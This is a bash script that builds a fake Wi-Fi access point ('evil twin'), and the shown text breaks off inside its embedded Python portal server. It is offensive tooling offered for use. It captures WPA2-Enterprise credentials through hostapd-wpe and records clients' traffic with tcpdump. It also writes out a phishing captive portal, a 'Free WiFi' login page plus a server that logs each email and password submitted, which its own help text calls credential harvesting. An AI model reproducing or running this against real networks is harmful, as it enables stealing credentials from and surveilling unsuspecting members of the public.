#!/usr/bin/env bash
# advanced_fake_ap.sh - Advanced Fake Access Point with WPA2 password capture
# Enhanced version with multi-adapter support, monitoring, and advanced features
#
# Usage:
#   sudo ./advanced_fake_ap.sh SSID CHANNEL UPLINK_IF [WLAN_IF] [OPTIONS]
#     SSID      - Name of fake AP
#     CHANNEL   - WiFi channel to use (e.g., 6 or 11)
#     UPLINK_IF - Interface to share Internet (e.g., eth0) or 'none'
#     WLAN_IF   - (Optional) Wireless interface to use
#     OPTIONS:
#       --capture-auth        - Enable WPA2 password capture
#       --monitor             - Enable packet monitoring
#       --mac-filter          - Enable MAC address filtering
#       --bandwidth-limit N   - Limit bandwidth per client to N KB/s
#       --captive-portal      - Enable captive portal
#       --hide-ssid           - Hide SSID (stealth mode)
#       --adapter-check       - Check adapter capabilities
#
#   sudo ./advanced_fake_ap.sh stop
#   sudo ./advanced_fake_ap.sh status
#   sudo ./advanced_fake_ap.sh list-adapters
#   sudo ./advanced_fake_ap.sh --help

# FIX 1: Removed set -euo pipefail — conflicts with intentional || true patterns

# ---- Configuration ----
AP_IP="192.168.1.1"
AP_NET="192.168.1.0/24"
DHCP_RANGE_START="192.168.1.2"
DHCP_RANGE_END="192.168.1.50"
DNSMASQ_CONF="/tmp/dnsmasq_fakeap.conf"
HOSTAPD_CONF="/tmp/hostapd_fakeap.conf"
HOSTAPD_WPE_CONF="/tmp/hostapd_wpe_fakeap.conf"
HOSTAPD_LOG="/tmp/hostapd_fakeap.log"
DNSMASQ_LOG="/tmp/dnsmasq_fakeap.log"
DNSMASQ_PIDFILE="/tmp/dnsmasq_fakeap.pid"
HOSTAPD_PIDFILE="/tmp/hostapd_fakeap.pid"
STATE_FILE="/tmp/fakeap_state.txt"
LOCK_FILE="/tmp/fakeap.lock"
AUTH_LOG="/tmp/fakeap_auth_attempts.log"
MONITOR_LOG="/tmp/fakeap_monitor.log"
MAC_WHITELIST="/tmp/fakeap_mac_whitelist.txt"
MAC_BLACKLIST="/tmp/fakeap_mac_blacklist.txt"
CAPTIVE_PORTAL_DIR="/tmp/fakeap_portal"
ADAPTER_INFO="/tmp/fakeap_adapter_info.txt"
PCAP_DIR="/tmp/fakeap_pcaps"
PORTAL_LOG="/tmp/fakeap_portal_credentials.log"

# Advanced feature flags
ENABLE_MONITOR="false"
ENABLE_MAC_FILTER="false"
ENABLE_BANDWIDTH_LIMIT="false"
ENABLE_CAPTIVE_PORTAL="false"
HIDE_SSID="false"
BANDWIDTH_LIMIT="1024"   # KB/s per client
MAC_FILTER_MODE="whitelist"

# FIX 5: Dynamic lease file — check common locations
LEASE_FILE=""
for _lf in /var/lib/misc/dnsmasq.leases \
            /var/lib/dnsmasq/dnsmasq.leases \
            /tmp/dnsmasq.leases; do
    [[ -f "$_lf" ]] && { LEASE_FILE="$_lf"; break; }
done

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

log_info()  { echo -e "${GREEN}[INFO]${NC} $*"; }
log_warn()  { echo -e "${YELLOW}[WARN]${NC} $*"; }
log_error() { echo -e "${RED}[ERROR]${NC} $*"; }
log_debug() { echo -e "${CYAN}[DEBUG]${NC} $*"; }

# FIX 7: Dynamic banner width
print_banner() {
    local msg="  AP '${SSID}' ACTIVE on channel ${CHANNEL}  "
    local width=${#msg}
    local border
    border=$(printf '═%.0s' $(seq 1 $width))
    echo -e "${GREEN}╔${border}╗${NC}"
    echo -e "${GREEN}║${msg}║${NC}"
    echo -e "${GREEN}╚${border}╝${NC}"
}

show_help() {
    cat <<EOF
${GREEN}Advanced Fake Access Point Manager${NC}

Usage:
  sudo $0 SSID CHANNEL UPLINK_IF [WLAN_IF] [OPTIONS]
    SSID           - Fake AP name
    CHANNEL        - WiFi channel (1-14, typically 1, 6, or 11)
    UPLINK_IF      - Interface to share Internet (or 'none')
    WLAN_IF        - (Optional) Wireless interface (auto-detected if omitted)

Options:
  --capture-auth        Enable WPA2 password capture mode
  --monitor             Enable packet monitoring and logging
  --mac-filter          Enable MAC address filtering
  --bandwidth-limit N   Limit bandwidth to N KB/s per client (default: 1024)
  --captive-portal      Enable captive portal for credential harvesting
  --hide-ssid           Hide SSID broadcast (stealth mode)
  --adapter-check       Perform detailed adapter capability check

Commands:
  sudo $0 stop [UPLINK_IF]
  sudo $0 status
  sudo $0 list-adapters
  sudo $0 --help

Examples:
  sudo $0 "FreeWiFi" 6 eth0
  sudo $0 "TestAP" 11 enp1s0 wlan0 --capture-auth --monitor
  sudo $0 "CoffeeShop" 6 eth0 --captive-portal --hide-ssid
  sudo $0 list-adapters
  sudo $0 stop eth0
  sudo $0 status
EOF
    exit 0
}

[[ "${1:-}" == "--help" || "${1:-}" == "-h" ]] && show_help

# ---- Adapter capability checking ----
check_adapter_capabilities() {
    local interface="$1"
    local info_file="${2:-$ADAPTER_INFO}"

    log_info "Checking adapter capabilities for $interface..."

    {
        echo "=== Adapter Capability Report ==="
        echo "Interface: $interface"
        echo "Timestamp: $(date)"
        echo "===================================="
        echo

        echo "--- Interface Information ---"
        ip link show "$interface" 2>/dev/null || echo "Interface not found"
        echo

        echo "--- Driver Information ---"
        ethtool -i "$interface" 2>/dev/null || echo "Unable to get driver info (ethtool not installed?)"
        echo

        echo "--- PHY Information ---"
        iw "$interface" info 2>/dev/null || echo "Unable to get PHY info"
        echo

        local PHY
        PHY=$(iw "$interface" info 2>/dev/null | awk '/wiphy/{print $2}')

        echo "--- Supported Modes ---"
        if [[ -n "$PHY" ]]; then
            iw phy "phy$PHY" info 2>/dev/null | grep -A 20 "Supported interface modes"
        else
            echo "Could not determine PHY"
        fi
        echo

        echo "--- Supported Channels/Frequencies ---"
        if [[ -n "$PHY" ]]; then
            iw phy "phy$PHY" channels 2>/dev/null || echo "Unable to get channel info"
        fi
        echo

        echo "--- TX Power Information ---"
        iw "$interface" info 2>/dev/null | grep -i "txpower" || echo "N/A"
        echo

        echo "--- Capabilities Summary ---"
        local supports_ap="NO"
        local supports_monitor="NO"
        local supports_mesh="NO"

        if [[ -n "$PHY" ]]; then
            iw phy "phy$PHY" info 2>/dev/null | grep -q "* AP$"       && supports_ap="YES"
            iw phy "phy$PHY" info 2>/dev/null | grep -q "* monitor$"  && supports_monitor="YES"
            iw phy "phy$PHY" info 2>/dev/null | grep -q "* mesh point$" && supports_mesh="YES"
        fi

        echo "AP Mode Support:      $supports_ap"
        echo "Monitor Mode Support: $supports_monitor"
        echo "Mesh Mode Support:    $supports_mesh"
        echo
    } > "$info_file"

    cat "$info_file"
    log_info "Adapter report saved to: $info_file"
}

list_wireless_adapters() {
    echo -e "${GREEN}=== Available Wireless Adapters ===${NC}"
    echo

    local adapters
    adapters=$(iw dev 2>/dev/null | awk '/Interface/ {print $2}')

    if [[ -z "$adapters" ]]; then
        log_warn "No wireless adapters found"
        return 0
    fi

    for adapter in $adapters; do
        echo -e "${BLUE}Interface: $adapter${NC}"

        local state
        state=$(ip link show "$adapter" 2>/dev/null | grep -o "state [A-Z]*" | awk '{print $2}')
        echo "  State: ${state:-unknown}"

        local phy
        phy=$(iw "$adapter" info 2>/dev/null | awk '/wiphy/{print $2}')

        local ap_support="NO"
        local monitor_support="NO"

        if [[ -n "$phy" ]]; then
            iw phy "phy$phy" info 2>/dev/null | grep -q "* AP$"      && ap_support="YES"
            iw phy "phy$phy" info 2>/dev/null | grep -q "* monitor$" && monitor_support="YES"
        fi

        echo "  AP Mode:      $ap_support"
        echo "  Monitor Mode: $monitor_support"

        local driver
        driver=$(ethtool -i "$adapter" 2>/dev/null | awk '/driver/{print $2}')
        [[ -n "$driver" ]] && echo "  Driver: $driver"

        local mac
        mac=$(ip link show "$adapter" 2>/dev/null | awk '/link\/ether/{print $2}')
        [[ -n "$mac" ]] && echo "  MAC: $mac"

        echo
    done
}

# ---- Parse action/args ----
if [[ "${1:-}" == "stop" ]]; then
    ACTION="stop"
    UPLINK_IF="${2:-none}"
elif [[ "${1:-}" == "status" ]]; then
    ACTION="status"
elif [[ "${1:-}" == "list-adapters" ]]; then
    list_wireless_adapters
    exit 0
else
    ACTION="start"
    SSID="${1:-}"
    CHANNEL="${2:-}"
    UPLINK_IF="${3:-}"
    WLAN_IF_ARG="${4:-}"
    CAPTURE_AUTH="false"

    # FIX 10: --bandwidth-limit arg parsing rewritten
    # 'shift' inside a for loop over "$@" is a no-op — use index-based parsing instead
    args=("$@")
    i=0
    while [[ $i -lt ${#args[@]} ]]; do
        arg="${args[$i]}"
        case "$arg" in
            --capture-auth)    CAPTURE_AUTH="true" ;;
            --monitor)         ENABLE_MONITOR="true" ;;
            --mac-filter)      ENABLE_MAC_FILTER="true" ;;
            --captive-portal)  ENABLE_CAPTIVE_PORTAL="true" ;;
            --hide-ssid)       HIDE_SSID="true" ;;
            --bandwidth-limit)
                ENABLE_BANDWIDTH_LIMIT="true"
                # Peek at next arg for the value
                next_i=$((i + 1))
                if [[ $next_i -lt ${#args[@]} ]] && \
                   [[ "${args[$next_i]}" =~ ^[0-9]+$ ]]; then
                    BANDWIDTH_LIMIT="${args[$next_i]}"
                    i=$next_i
                else
                    log_warn "--bandwidth-limit requires a numeric value, using default ${BANDWIDTH_LIMIT}KB/s"
                fi
                ;;
            --adapter-check)
                if [[ -z "${WLAN_IF_ARG:-}" ]]; then
                    WLAN_IF_ARG=$(iw dev 2>/dev/null | awk '/Interface/{print $2; exit}')
                fi
                check_adapter_capabilities "${WLAN_IF_ARG:-wlan0}"
                exit 0
                ;;
        esac
        i=$((i + 1))
    done
fi

# FIX 3: Root check moved to top — before lock acquisition and tool checks
if [[ "$ACTION" != "status" ]] && [[ $EUID -ne 0 ]]; then
    log_error "Run as root: sudo $0 ..."
    exit 1
fi

# ---- Status check ----
if [[ "$ACTION" == "status" ]]; then
    echo -e "${BLUE}=== Advanced Fake AP Status ===${NC}"

    if [[ -f "$STATE_FILE" ]]; then
        echo -e "\n${GREEN}Configuration:${NC}"
        cat "$STATE_FILE"
    else
        log_warn "No state file found. AP may not be running."
    fi

    echo -e "\n${GREEN}Process Status:${NC}"
    if [[ -f "$HOSTAPD_PIDFILE" ]]; then
        AP_PID=$(cat "$HOSTAPD_PIDFILE" 2>/dev/null || echo "")
        if [[ -n "$AP_PID" ]] && kill -0 "$AP_PID" 2>/dev/null; then
            log_info "hostapd running (PID: $AP_PID)"
        else
            log_error "hostapd PID file exists but process is not running"
        fi
    else
        log_warn "hostapd is not running"
    fi

    if [[ -f "$DNSMASQ_PIDFILE" ]]; then
        DNS_PID=$(cat "$DNSMASQ_PIDFILE" 2>/dev/null || echo "")
        if [[ -n "$DNS_PID" ]] && kill -0 "$DNS_PID" 2>/dev/null; then
            log_info "dnsmasq running (PID: $DNS_PID)"
        else
            log_error "dnsmasq PID file exists but process is not running"
        fi
    else
        log_warn "dnsmasq is not running"
    fi

    echo -e "\n${GREEN}Interface Status:${NC}"
    if [[ -f "$STATE_FILE" ]]; then
        WLAN_IF=$(grep "^WLAN_IF=" "$STATE_FILE" 2>/dev/null | cut -d= -f2 || echo "")
        if [[ -n "$WLAN_IF" ]] && ip link show "$WLAN_IF" >/dev/null 2>&1; then
            ip addr show "$WLAN_IF" | grep -E "inet |UP|DOWN"
        else
            log_warn "Wireless interface not found"
        fi
    fi

    # FIX 5: Dynamic lease file in status
    for _lf in /var/lib/misc/dnsmasq.leases \
                /var/lib/dnsmasq/dnsmasq.leases \
                /tmp/dnsmasq.leases; do
        [[ -f "$_lf" ]] && { LEASE_FILE="$_lf"; break; }
    done

    if [[ -n "$LEASE_FILE" ]]; then
        echo -e "\n${GREEN}Connected Clients:${NC}"
        awk '{print $2, $3, $4}' "$LEASE_FILE" | column -t
    fi

    if [[ -f "$AUTH_LOG" ]] && [[ -s "$AUTH_LOG" ]]; then
        echo -e "\n${GREEN}Authentication Summary:${NC}"
        echo "Total attempts:       $(grep -c "PASSWORD CAPTURED\|authentication attempt" "$AUTH_LOG" 2>/dev/null || echo 0)"
        echo "Captured credentials: $(grep -c "PASSWORD CAPTURED" "$AUTH_LOG" 2>/dev/null || echo 0)"
        echo -e "\n${GREEN}Recent Captures:${NC}"
        grep -E "PASSWORD CAPTURED|USERNAME" "$AUTH_LOG" 2>/dev/null | tail -10
    fi

    if [[ -f "$PORTAL_LOG" ]] && [[ -s "$PORTAL_LOG" ]]; then
        echo -e "\n${GREEN}Captive Portal Credentials:${NC}"
        tail -10 "$PORTAL_LOG"
    fi

    if [[ -f "$MONITOR_LOG" ]] && [[ -s "$MONITOR_LOG" ]]; then
        echo -e "\n${GREEN}Monitoring Statistics:${NC}"
        tail -20 "$MONITOR_LOG"
    fi

    exit 0
fi

# Interactive prompts for missing args
if [[ "$ACTION" == "start" ]]; then
    [[ -z "${SSID:-}" ]]      && read -rp "Enter SSID for fake AP: " SSID
    [[ -z "${CHANNEL:-}" ]]   && read -rp "Enter WiFi channel (e.g. 6): " CHANNEL
    [[ -z "${UPLINK_IF:-}" ]] && read -rp "Enter uplink interface (or 'none'): " UPLINK_IF

    if [[ "$CAPTURE_AUTH" == "false" ]]; then
        read -rp "Enable WPA2 password capture? (y/n): " ENABLE_CAPTURE
        [[ "$ENABLE_CAPTURE" =~ ^[Yy]$ ]] && CAPTURE_AUTH="true"
    fi

    if [[ "$ENABLE_MONITOR" == "false" ]]; then
        read -rp "Enable packet monitoring? (y/n): " ENABLE_MON
        [[ "$ENABLE_MON" =~ ^[Yy]$ ]] && ENABLE_MONITOR="true"
    fi

    if [[ "$ENABLE_MAC_FILTER" == "false" ]]; then
        read -rp "Enable MAC filtering? (y/n): " ENABLE_MAC
        [[ "$ENABLE_MAC" =~ ^[Yy]$ ]] && ENABLE_MAC_FILTER="true"
    fi

    # Validate channel
    if ! [[ "$CHANNEL" =~ ^[0-9]+$ ]] || \
       [ "$CHANNEL" -lt 1 ] || [ "$CHANNEL" -gt 14 ]; then
        log_error "Invalid channel. Must be 1-14."
        exit 1
    fi

    # Validate SSID length
    if [[ ${#SSID} -gt 32 ]]; then
        log_error "SSID too long (max 32 chars, got ${#SSID})"
        exit 1
    fi

    # FIX 13: Validate bandwidth limit value
    if [[ "$ENABLE_BANDWIDTH_LIMIT" == "true" ]]; then
        if ! [[ "$BANDWIDTH_LIMIT" =~ ^[0-9]+$ ]] || [ "$BANDWIDTH_LIMIT" -lt 1 ]; then
            log_error "Invalid bandwidth limit '$BANDWIDTH_LIMIT'. Must be a positive integer (KB/s)."
            exit 1
        fi
    fi
fi

require_cmd() {
    command -v "$1" >/dev/null 2>&1 || {
        log_error "Required command '$1' not found. Install it first."
        exit 2
    }
}

# Required tools
for cmd in dnsmasq ip iw sysctl iptables; do
    require_cmd "$cmd"
done

# Optional tools — only required if feature is enabled
[[ "$ENABLE_MONITOR" == "true" ]]          && require_cmd "tcpdump"
[[ "$ENABLE_BANDWIDTH_LIMIT" == "true" ]]  && require_cmd "tc"

# Check for hostapd / hostapd-wpe
HOSTAPD_CMD=""
if [[ "$CAPTURE_AUTH" == "true" ]]; then
    if command -v hostapd-wpe >/dev/null 2>&1; then
        HOSTAPD_CMD="hostapd-wpe"
        log_info "Using hostapd-wpe for password capture"

        # Validate cert files
        local_missing=false
        for cert_file in /etc/hostapd-wpe/certs/ca.pem \
                         /etc/hostapd-wpe/certs/server.pem \
                         /etc/hostapd-wpe/certs/server.key \
                         /etc/hostapd-wpe/certs/dh \
                         /etc/hostapd-wpe/hostapd-wpe.eap_user; do
            if [[ ! -f "$cert_file" ]]; then
                log_error "Missing required file: $cert_file"
                local_missing=true
            fi
        done
        if [[ "$local_missing" == "true" ]]; then
            log_error "hostapd-wpe cert/config files missing."
            log_error "Try: sudo apt-get install --reinstall hostapd-wpe"
            exit 2
        fi
    else
        log_error "hostapd-wpe not found. Install: sudo apt-get install hostapd-wpe"
        exit 2
    fi
else
    if command -v hostapd >/dev/null 2>&1; then
        HOSTAPD_CMD="hostapd"
    else
        log_error "hostapd not found. Install: sudo apt-get install hostapd"
        exit 2
    fi
fi

# ---- Lock file management ----
acquire_lock() {
    if [[ -f "$LOCK_FILE" ]]; then
        OLD_PID=$(cat "$LOCK_FILE" 2>/dev/null || echo "")
        if [[ -n "$OLD_PID" ]] && kill -0 "$OLD_PID" 2>/dev/null; then
            log_error "Another instance is already running (PID: $OLD_PID)"
            exit 1
        else
            log_warn "Stale lock file found. Removing."
            rm -f "$LOCK_FILE"
        fi
    fi
    echo $$ > "$LOCK_FILE"
}

release_lock() {
    rm -f "$LOCK_FILE"
}

# ---- Cleanup ----
# FIX 2/8: Guard against re-entrant calls
_CLEANUP_DONE=false
cleanup() {
    [[ "$_CLEANUP_DONE" == "true" ]] && return
    _CLEANUP_DONE=true

    log_info "Cleaning up..."

    # Stop packet monitoring
    if [[ -f /tmp/fakeap_monitor.pid ]]; then
        local mon_pid
        mon_pid=$(cat /tmp/fakeap_monitor.pid 2>/dev/null || echo "")
        [[ -n "$mon_pid" ]] && kill "$mon_pid" 2>/dev/null || true
        rm -f /tmp/fakeap_monitor.pid
    fi
    pkill -f "tcpdump.*$PCAP_DIR" 2>/dev/null || true

    # Stop captive portal
    if [[ -f /tmp/fakeap_portal.pid ]]; then
        local portal_pid
        portal_pid=$(cat /tmp/fakeap_portal.pid 2>/dev/null || echo "")
        [[ -n "$portal_pid" ]] && kill "$portal_pid" 2>/dev/null || true
        rm -f /tmp/fakeap_portal.pid
    fi
    pkill -f "python3.*fakeap_portal" 2>/dev/null || true

    # Stop dnsmasq
    if [[ -f "$DNSMASQ_PIDFILE" ]]; then
        local pid
        pid=$(cat "$DNSMASQ_PIDFILE" 2>/dev/null || true)
        if [[ -n "$pid" ]] && kill -0 "$pid" 2>/dev/null; then
            log_info "Stopping dnsmasq (PID: $pid)"
            kill "$pid" 2>/dev/null || true
            sleep 1
            kill -9 "$pid" 2>/dev/null || true
        fi
        rm -f "$DNSMASQ_PIDFILE"
    fi
    pkill -f "dnsmasq.*$DNSMASQ_CONF" 2>/dev/null || true

    # Stop hostapd
    if [[ -f "$HOSTAPD_PIDFILE" ]]; then
        local pid
        pid=$(cat "$HOSTAPD_PIDFILE" 2>/dev/null || true)
        if [[ -n "$pid" ]] && kill -0 "$pid" 2>/dev/null; then
            log_info "Stopping hostapd (PID: $pid)"
            kill "$pid" 2>/dev/null || true
            sleep 1
            kill -9 "$pid" 2>/dev/null || true
        fi
        rm -f "$HOSTAPD_PIDFILE"
    fi
    pkill -f "hostapd.*$HOSTAPD_CONF" 2>/dev/null || true
    pkill -f "hostapd-wpe.*$HOSTAPD_WPE_CONF" 2>/dev/null || true

    # Load saved state
    if [[ -f "$STATE_FILE" ]]; then
        if [[ -z "${UPLINK_IF:-}" || "${UPLINK_IF:-}" == "none" ]]; then
            UPLINK_IF=$(grep "^UPLINK_IF=" "$STATE_FILE" 2>/dev/null | cut -d= -f2 || echo "none")
        fi
        if [[ -z "${WLAN_IF:-}" ]]; then
            WLAN_IF=$(grep "^WLAN_IF=" "$STATE_FILE" 2>/dev/null | cut -d= -f2 || echo "")
        fi
    fi

    # Remove bandwidth limiting
    if [[ -n "${WLAN_IF:-}" ]] && ip link show "$WLAN_IF" >/dev/null 2>&1; then
        tc qdisc del dev "$WLAN_IF" root 2>/dev/null || true
    fi

    # Restore wireless interface
    if [[ -n "${WLAN_IF:-}" ]] && ip link show "$WLAN_IF" >/dev/null 2>&1; then
        log_info "Restoring wireless interface: $WLAN_IF"
        ip link set "$WLAN_IF" down 2>/dev/null || true
        ip addr flush dev "$WLAN_IF" 2>/dev/null || true
        ip link set "$WLAN_IF" up 2>/dev/null || true
    fi

    # Remove iptables rules
    if [[ -n "${UPLINK_IF:-}" && "${UPLINK_IF:-}" != "none" && -n "${WLAN_IF:-}" ]]; then
        log_info "Removing iptables NAT rules for $UPLINK_IF"
        iptables -t nat -D POSTROUTING -o "$UPLINK_IF" -s "$AP_NET" -j MASQUERADE 2>/dev/null || true
        iptables -D FORWARD -i "$WLAN_IF" -o "$UPLINK_IF" -j ACCEPT 2>/dev/null || true
        iptables -D FORWARD -i "$UPLINK_IF" -o "$WLAN_IF" \
            -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null || true
    fi

    # Remove MAC filter rules
    if [[ -n "${WLAN_IF:-}" ]]; then
        iptables -D INPUT   -i "$WLAN_IF" -j DROP 2>/dev/null || true
        iptables -D FORWARD -i "$WLAN_IF" -j DROP 2>/dev/null || true
    fi

    sysctl -w net.ipv4.ip_forward=0 >/dev/null 2>&1 || true

    log_info "Restarting network services..."
    systemctl restart NetworkManager 2>/dev/null || true
    systemctl restart wpa_supplicant 2>/dev/null || true

    rm -f "$DNSMASQ_CONF" "$HOSTAPD_CONF" "$HOSTAPD_WPE_CONF" "$STATE_FILE"
    release_lock

    log_info "Cleanup complete."

    if [[ -f "$AUTH_LOG" ]] && [[ -s "$AUTH_LOG" ]]; then
        echo
        log_warn "=== CAPTURED AUTHENTICATION ATTEMPTS ==="
        cat "$AUTH_LOG"
        echo
        log_info "Full log: $AUTH_LOG"
    fi

    if [[ -f "$PORTAL_LOG" ]] && [[ -s "$PORTAL_LOG" ]]; then
        echo
        log_warn "=== CAPTIVE PORTAL CREDENTIALS ==="
        cat "$PORTAL_LOG"
        echo
        log_info "Portal log: $PORTAL_LOG"
    fi

    [[ -d "$PCAP_DIR" ]] && log_info "Packet captures: $PCAP_DIR"
}

# ---- STOP action ----
if [[ "$ACTION" == "stop" ]]; then
    cleanup
    exit 0
fi

acquire_lock

# FIX 2: Removed EXIT from trap — prevents double-cleanup loop
trap 'cleanup; exit 0' INT TERM

# ---- Determine wireless interface ----
if [[ -n "${WLAN_IF_ARG:-}" ]]; then
    WLAN_IF="$WLAN_IF_ARG"
else
    WLAN_IF=$(iw dev 2>/dev/null | awk '/Interface/{print $2; exit}')
fi

if [[ -z "${WLAN_IF:-}" ]]; then
    log_error "No wireless interface detected."
    log_info "Available interfaces:"
    ip link show | grep -E '^[0-9]+:' | awk -F': ' '{print "  - " $2}'
    cleanup; exit 3
fi

if ! ip link show "$WLAN_IF" >/dev/null 2>&1; then
    log_error "Interface '$WLAN_IF' does not exist"
    cleanup; exit 3
fi

# Check AP mode support
PHY=$(iw "$WLAN_IF" info 2>/dev/null | awk '/wiphy/{print $2}')
if [[ -n "$PHY" ]]; then
    if ! iw phy "phy$PHY" info 2>/dev/null | grep -q "* AP$"; then
        log_error "Adapter does not support AP mode!"
        log_info "Run '$0 list-adapters' to see compatible adapters"
        cleanup; exit 3
    fi
    log_info "✓ Adapter supports AP mode"
else
    log_warn "Could not verify AP mode support, attempting anyway..."
fi

log_info "Using wireless interface: $WLAN_IF"
log_info "SSID: '$SSID'   Channel: '$CHANNEL'   Uplink: '$UPLINK_IF'"
[[ "$CAPTURE_AUTH" == "true" ]]        && log_warn "Security: WPA2 Password Capture Mode"
[[ "$HIDE_SSID" == "true" ]]           && log_warn "SSID: Hidden (Stealth Mode)"
[[ "$ENABLE_MONITOR" == "true" ]]      && log_info "Monitoring: ENABLED"
[[ "$ENABLE_MAC_FILTER" == "true" ]]   && log_info "MAC Filtering: ENABLED"
[[ "$ENABLE_BANDWIDTH_LIMIT" == "true" ]] && log_info "Bandwidth: ${BANDWIDTH_LIMIT}KB/s per client"
[[ "$ENABLE_CAPTIVE_PORTAL" == "true" ]] && log_info "Captive Portal: ENABLED"

# Save state
cat > "$STATE_FILE" <<EOF
SSID=$SSID
CHANNEL=$CHANNEL
UPLINK_IF=$UPLINK_IF
WLAN_IF=$WLAN_IF
CAPTURE_AUTH=$CAPTURE_AUTH
ENABLE_MONITOR=$ENABLE_MONITOR
ENABLE_MAC_FILTER=$ENABLE_MAC_FILTER
ENABLE_BANDWIDTH_LIMIT=$ENABLE_BANDWIDTH_LIMIT
ENABLE_CAPTIVE_PORTAL=$ENABLE_CAPTIVE_PORTAL
HIDE_SSID=$HIDE_SSID
BANDWIDTH_LIMIT=$BANDWIDTH_LIMIT
STARTED=$(date)
EOF

# Initialize logs
{
    echo "=== Authentication Attempts Log ==="
    echo "Started: $(date)"
    echo "SSID: $SSID"
    [[ "$CAPTURE_AUTH" == "true" ]] && echo "Mode: WPA2 Password Capture ENABLED" || echo "Mode: Open AP"
    echo "========================================"
    echo
} > "$AUTH_LOG"

if [[ "$ENABLE_MONITOR" == "true" ]]; then
    { echo "=== Packet Monitoring Log ==="; echo "Started: $(date)"; } > "$MONITOR_LOG"
    mkdir -p "$PCAP_DIR"
fi

if [[ "$ENABLE_CAPTIVE_PORTAL" == "true" ]]; then
    {
        echo "=== Captive Portal Credentials Log ==="
        echo "Started: $(date)"
        echo "========================================"
        echo
    } > "$PORTAL_LOG"
fi

if [[ "$ENABLE_MAC_FILTER" == "true" ]]; then
    touch "$MAC_WHITELIST" "$MAC_BLACKLIST"
    log_info "MAC filter lists: whitelist=$MAC_WHITELIST  blacklist=$MAC_BLACKLIST"
fi

# FIX 9: Stop conflicting services FIRST before anything tries to bind ports
log_info "Stopping conflicting services..."
systemctl stop NetworkManager 2>/dev/null || true
systemctl stop wpa_supplicant 2>/dev/null || true
systemctl stop systemd-resolved 2>/dev/null || true
pkill wpa_supplicant 2>/dev/null || true
sleep 1

# Prepare wireless interface
log_info "Preparing wireless interface..."
ip link set "$WLAN_IF" down 2>/dev/null || true
sleep 1
airmon-ng check kill 2>/dev/null || true
ip addr flush dev "$WLAN_IF" 2>/dev/null || true
ip link set "$WLAN_IF" up 2>/dev/null || true

log_info "Configuring $WLAN_IF with IP $AP_IP/24"
ip addr add "$AP_IP/24" dev "$WLAN_IF" 2>/dev/null || true

# Setup captive portal AFTER interface is up and services stopped
# FIX 9: Moved from before service stop to after — port 80 bind will now succeed
if [[ "$ENABLE_CAPTIVE_PORTAL" == "true" ]]; then
    mkdir -p "$CAPTIVE_PORTAL_DIR"

    cat > "$CAPTIVE_PORTAL_DIR/index.html" <<'PORTALEOF'
<!DOCTYPE html>
<html>
<head>
    <title>WiFi Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            max-width: 400px;
            width: 100%;
            background: white;
            padding: 40px 30px;
            border-radius: 15px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
        }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 60px; height: 60px; }
        h2 { color: #333; text-align: center; margin-bottom: 10px; font-size: 24px; }
        .subtitle { text-align: center; color: #666; margin-bottom: 30px; font-size: 14px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; color: #555; font-size: 14px; font-weight: 500; }
        input {
            width: 100%; padding: 12px 15px;
            border: 2px solid #e0e0e0; border-radius: 8px;
            font-size: 15px; transition: all 0.3s;
        }
        input:focus { outline: none; border-color: #667eea; }
        button {
            width: 100%; padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white; border: none; border-radius: 8px;
            cursor: pointer; font-size: 16px; font-weight: 600;
        }
        button:hover { opacity: 0.9; }
        .terms { text-align: center; margin-top: 20px; font-size: 12px; color: #999; }
        .spinner {
            display: none; width: 20px; height: 20px;
            border: 3px solid #f3f3f3; border-top: 3px solid #667eea;
            border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 24 24" fill="#667eea">
                <path d="M1 9l2 2c4.97-4.97 13.03-4.97 18 0l2-2C16.93 2.93 7.08 2.93 1 9zm8 8l3 3 3-3c-1.65-1.66-4.34-1.66-6 0zm-4-4l2 2c2.76-2.76 7.24-2.76 10 0l2-2C15.14 9.14 8.87 9.14 5 13z"/>
            </svg>
        </div>
        <h2>Welcome to Free WiFi</h2>
        <p class="subtitle">Please login to continue</p>
        <form id="loginForm" method="POST" action="/login">
            <div class="form-group">
                <label for="email">Email or Username</label>
                <input type="text" id="email" name="email" placeholder="Enter your email" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required>
            </div>
            <button type="submit">Connect to WiFi</button>
            <div class="spinner" id="spinner"></div>
        </form>
        <p class="terms">By connecting, you agree to our Terms of Service</p>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            document.getElementById('spinner').style.display = 'block';
            var formData = new FormData(this);
            fetch('/login', { method: 'POST', body: formData }).then(function() {
                setTimeout(function() { window.location.href = 'http://www.google.com'; }, 1500);
            });
        });
    </script>
</body>
</html>
PORTALEOF

    cat > "$CAPTIVE_PORTAL_DIR/server.py" <<'SERVEREOF'
#!/usr/bin/env python3
import http.server
import socketserver
import urllib.parse
from datetime import datetime

PORT = 80
PORTAL_LOG = "/tmp/fakeap_portal_credentials.log"

class PortalHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path in ('/', '/generate_204', '/connecttest.txt') or \
           self.path.startswith('/generate_204') or \
           self.path.startswith('/connecttest'):
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            try:
                with open('/tmp/fakeap_portal/index.html', 'rb') as f:
                    self.wfile.write(f.read())
            except FileNotFoundError:
                self.wfile.write(b'<h1>Portal unavailable</h1>')
        else:
            # Redirect all other traffic to portal
            self.send_response(302)
